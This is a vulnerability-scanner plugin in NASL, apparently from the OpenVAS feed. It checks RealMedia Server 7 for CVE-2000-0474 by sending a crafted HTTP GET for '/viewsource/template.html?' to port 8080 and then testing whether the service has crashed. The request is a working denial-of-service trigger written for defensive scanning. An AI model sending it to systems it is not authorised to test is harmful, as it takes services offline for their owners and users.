# SPDX-FileCopyrightText: 2000 John Lampe
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10461");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_cve_id("CVE-2000-0474");
  script_name("RealMedia Server DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2000 John Lampe");
  script_dependencies("find_service.nasl", "global_settings.nasl");
  script_require_ports(7070, 8080); # nb: port 7070, which may be indicative of server on 8080
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/1288");

  script_tag(name:"summary", value:"It is possible to crash a RealServer version 7 by sending a
  malformed HTTP request.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if the remote
  service is still available afterwards.");

  script_tag(name:"solution", value:"Update to the most recent version of RealMedia Server.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = 8080;
if(!get_port_state(port))
  exit(0);

if(http_is_dead(port:port))
  exit(0);

if(!soc = http_open_socket(port))
  exit(0);

url = "/viewsource/template.html?";
req = http_get(item:url, port:port);
send(socket:soc, data:req);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
